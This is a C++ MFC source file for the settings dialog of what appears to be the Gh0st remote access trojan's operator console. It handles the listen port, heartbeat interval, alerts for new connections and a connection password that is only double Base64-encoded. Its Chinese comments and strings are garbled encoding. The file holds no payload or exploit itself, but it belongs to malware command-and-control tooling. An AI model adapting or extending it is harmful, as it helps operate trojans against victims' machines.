// SettingDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "SettingDlg.h"
#include "MainFrm.h"
#include "LogView.h"
#include "base64a.h"
#include "UpdateDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CMainFrame	*g_pFrame;
extern CIOCPServer	*m_iocpServer;
extern CLogView* g_pLogView;

CUpdateDlg  g_CUPDATEIP;

/////////////////////////////////////////////////////////////////////////////
CString prev_connect_pass;
// CSettingDlg dialog


CSettingDlg::CSettingDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CSettingDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSettingDlg)
	m_disble_poptips = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "PopTips", FALSE);
	m_listen_port = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 8000);
	m_warning_tone =  ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Alarm", FALSE);
	m_edit_heartbeat_time = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "HeartBeatTime", 0);
	m_check_list_draw =  ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "LIST_DRAW", FALSE);
	m_national = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "National",TRUE);
//	m_edit_connect_pass = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings", "ConnectPass", "");
	CString Mistr1 = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings", "ConnectPass", "");
	CString Mistr2;
	Mistr2 = g_CUPDATEIP.Base64Decode(Mistr1);//���ݽ���
	m_edit_connect_pass = g_CUPDATEIP.Base64Decode(Mistr2);     //����2�ν���

	//}}AFX_DATA_INIT
	prev_connect_pass = m_edit_connect_pass;

}


void CSettingDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSettingDlg)
	DDX_Check(pDX, IDC_CHECK_DISABLE_POPTIPS, m_disble_poptips);
	DDX_Text(pDX, IDC_EDIT_LISTEN_PORT, m_listen_port);
	DDV_MinMaxUInt(pDX, m_listen_port, 1, 65535);
	DDX_Check(pDX, IDC_CHECK_WARNING_TONE, m_warning_tone);
	DDX_Text(pDX, IDC_EDIT_HEARTBEAT_TIME, m_edit_heartbeat_time);
	DDV_MinMaxUInt(pDX, m_edit_heartbeat_time, 0, 60);
	DDX_Check(pDX, IDC_CHECK_LIST_DRAW, m_check_list_draw);
	DDX_Text(pDX, IDC_EDIT_CONNECT_PASS, m_edit_connect_pass);
	DDX_Check(pDX, IDC_NATIONAL, m_national);//����
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSettingDlg, CDialog)
	//{{AFX_MSG_MAP(CSettingDlg)
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_NATIONAL, OnNational)//����

END_MESSAGE_MAP()

void CSettingDlg::rebootmeA()//����������
{
	PROCESS_INFORMATION   info;
	STARTUPINFO startup;
	char szPath[128];
	char *szCmdLine;
	
	GetModuleFileName(AfxGetApp()->m_hInstance,   szPath,   sizeof(szPath));
	szCmdLine   =   GetCommandLine();
	GetStartupInfo(&startup);
	BOOL   bSucc   =   CreateProcess(szPath,   szCmdLine,   NULL,   NULL,
		FALSE,   NORMAL_PRIORITY_CLASS,   NULL,   NULL, &startup,   &info);
	
	if(TRUE   &&   bSucc)
	{
		CWnd *pWnd   =   AfxGetMainWnd();
		
		if(pWnd   !=   NULL)
		{
			pWnd->PostMessage(WM_CLOSE,   0,   0);
		}   
		else
			ExitProcess(-1);
	}   
	else   
		ExitProcess(-1);
}
/////////////////////////////////////////////////////////////////////////////
// CSettingDlg message handlers

void CSettingDlg::OnOK() 
{
	// TODO: Add extra validation here
	UINT prev_heatbeattime = m_edit_heartbeat_time;
	int prev_port = m_listen_port;
	BOOL pre_poptips = m_disble_poptips;
	BOOL pre_Warning_tone = m_warning_tone;
	BOOL pre_List_Drew = m_check_list_draw;
	BOOL national = m_national;

	UpdateData(TRUE);
	if (prev_port != m_listen_port)
	{
		g_pFrame->Activate(m_listen_port, m_iocpServer->m_nMaxConnections);
		g_pLogView->InsertLogItem( "���Ӷ˿��޸ĳɹ� ...", 0, 1 );
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "ListenPort", m_listen_port);
	}

	if (pre_poptips != m_disble_poptips)
	{
		((CGh0stApp *)AfxGetApp())->m_bIsDisablePopTips = m_disble_poptips;
		g_pLogView->InsertLogItem( "������ʾ�޸ĳɹ� ...", 0, 1 );
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "PopTips", m_disble_poptips);
	}

	if (pre_Warning_tone != m_warning_tone)
	{
		((CGh0stApp *)AfxGetApp())->m_bIsWarning_Tone = m_warning_tone;
		g_pLogView->InsertLogItem( "������ʾ�޸ĳɹ� ...", 0, 1 );
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "Alarm", m_warning_tone);
	}

	if(pre_List_Drew != m_check_list_draw)
	{
		((CGh0stApp *)AfxGetApp())->m_bIsList_Draw = m_check_list_draw;
		g_pLogView->InsertLogItem( "���������޸ĳɹ� ...", 0, 1 );
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "LIST_DRAW", m_check_list_draw);
	}

	if(prev_heatbeattime!= m_edit_heartbeat_time)
	{
		UpdateData(TRUE);
		/*AfxMessageBox("��������,���������");*/
		if(MessageBox("ϵͳ�����Ѿ����ģ������������Ч..."," ��ܰ��ʾ��",MB_ICONQUESTION|MB_YESNO)==IDYES)
		{
			((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "HeartBeatTime", m_edit_heartbeat_time);
			rebootmeA();
			ExitProcess(0);
		}
		
	}
	if ( ((CButton *)GetDlgItem(IDC_NATIONAL))->GetCheck() == TRUE )
	{
		UpdateData(TRUE);
        national=TRUE;
	    g_pLogView->InsertLogItem( "�����", 0, 1 );
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "National", TRUE);

	}
	else
	{	UpdateData(TRUE);
	

		national=FALSE;
		   g_pLogView->InsertLogItem( "����ر�", 0, 1 );
		   ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "National", FALSE);

	}
	CString Mistr1;
	CString Mistr2;
	Mistr1 = g_CUPDATEIP.Base64Encode(m_edit_connect_pass);//���ݼ���
	Mistr2 = g_CUPDATEIP.Base64Encode(Mistr1);     //����2�μ���
	DWORD IpPass = strlen(m_edit_connect_pass);
    if (prev_connect_pass != m_edit_connect_pass)
	{
	if(IpPass == 0)
	{	
		AfxMessageBox( "ͨѶ���벻��Ϊ�գ����������� ... ...");
		return ;
	}
	else if(IpPass <= 5)
	{		
		AfxMessageBox( "ͨѶ�������, ��С6λ ...");
		return ;
	}
	else if(IpPass >= 30)
	{	
		AfxMessageBox( "ͨѶ����Ҳ̫����?? �Լ򵥵�� ... ...");
		return ;
	}
	g_pLogView->InsertLogItem( "���������޸ĳɹ� ...", 0, 1 );
	
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Settings", "ConnectPass", Mistr2);

}

	CDialog::OnOK();
	if(MessageBox("ϵͳ�����Ѿ����ģ������������Ч..."," ��ܰ��ʾ��",MB_ICONQUESTION|MB_YESNO)==IDYES)
	{
	//	g_pFrame->m_bSetRestart = TRUE;
		AfxGetMainWnd()->SendMessage(WM_CLOSE);
	}

}
void  CSettingDlg::OnNational() 
{
	// TODO: Add your control notification handler code here
	// 	UpdateData();
	// 	
	// 	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "National", m_national);
	// 	SetDlgItemText(IDC_SHOWTIPS, "��ʾ����ͼ�����óɹ�");
	// 	if(MessageBox("ϵͳ�����Ѿ����ģ������������Ч..."," ��ܰ��ʾ��",MB_ICONQUESTION|MB_YESNO)==IDYES)
	// 	{
	// 		g_pFrame->m_bSetRestart = TRUE;
	// 		AfxGetMainWnd()->SendMessage(WM_CLOSE);
	// 	}
	UpdateData();
	((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "National", m_national);
	if ( ((CButton *)GetDlgItem(IDC_NATIONAL))->GetCheck() == TRUE )
	{
	//	SetDlgItemText(IDC_SHOWTIPS, "��ʾ����ͼ�����óɹ��������������Ч");
	}
	else
	{
	//	SetDlgItemText(IDC_SHOWTIPS, "�ѹرչ���ͼ�꣬�����������Ч");
	}
}